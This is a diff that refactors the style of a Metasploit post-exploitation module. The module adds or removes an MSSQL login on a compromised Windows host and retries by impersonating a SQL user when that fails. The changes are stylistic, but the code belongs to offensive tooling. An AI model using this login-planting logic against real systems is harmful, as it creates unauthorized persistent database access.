@@ -3,6 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'English'
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::MSSQL
 
@@ -69,7 +70,7 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
       print_status("#{session_display_info}: Identified service '#{service[:display]}', PID: #{service[:pid]}")
-      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').lstrip.rstrip
+      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').strip
 
       if datastore['REMOVE_LOGIN']
         remove_login(service, instance_name)
@@ -83,36 +84,32 @@ class MetasploitModule < Msf::Post
   end
 
   def add_login(service, instance_name)
-    begin
-      add_login_status = add_sql_login(datastore['DB_USERNAME'],
-                                       datastore['DB_PASSWORD'],
-                                       instance_name)
+    add_login_status = add_sql_login(datastore['DB_USERNAME'],
+                                     datastore['DB_PASSWORD'],
+                                     instance_name)
 
-      unless add_login_status
-        raise RuntimeError, "Retry"
-      end
-    rescue RuntimeError => e
-      if e.message == "Retry"
-        retry if impersonate_sql_user(service)
-      else
-        raise $!
-      end
+    unless add_login_status
+      raise 'Retry'
+    end
+  rescue RuntimeError => e
+    if e.message == 'Retry'
+      retry if impersonate_sql_user(service)
+    else
+      raise $ERROR_INFO
     end
   end
 
   def remove_login(service, instance_name)
-    begin
-      remove_status = remove_sql_login(datastore['DB_USERNAME'], instance_name)
+    remove_status = remove_sql_login(datastore['DB_USERNAME'], instance_name)
 
-      unless remove_status
-        raise RuntimeError, "Retry"
-      end
-    rescue RuntimeError => e
-      if e.message == "Retry"
-        retry if impersonate_sql_user(service)
-      else
-        raise $!
-      end
+    unless remove_status
+      raise 'Retry'
+    end
+  rescue RuntimeError => e
+    if e.message == 'Retry'
+      retry if impersonate_sql_user(service)
+    else
+      raise $ERROR_INFO
     end
   end
 
